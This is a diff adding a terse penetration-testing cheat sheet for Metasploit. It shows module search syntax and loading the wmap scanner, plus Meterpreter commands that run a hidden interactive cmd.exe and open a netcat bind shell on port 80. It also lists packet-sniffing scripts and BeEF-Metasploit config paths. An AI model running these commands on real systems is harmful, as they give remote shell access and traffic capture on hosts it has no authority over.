@@ -1,0 +1,28 @@
+search name:.....
+       path:.....
+       platform:...
+       type:.....
+
+
+//wmap is a general purpose web application scanning framework.
+load wmap
+
+
+execute -f cmd.exe -i -H
+execute -f "nc.exe -l -p 80 -e cmd.exe"
+
+
+run sniffer
+or
+run packetrecorder
+
+
+*********
+beef + metasploit
+# msfconsole
+# load msgrpc
+
+to edit /pentest/web/beef/config.yaml
+        /pentest/web/beef/extensions/metasploit/config.yaml
+        /pentest/web/beef/modules/metasploit/config.yaml
+
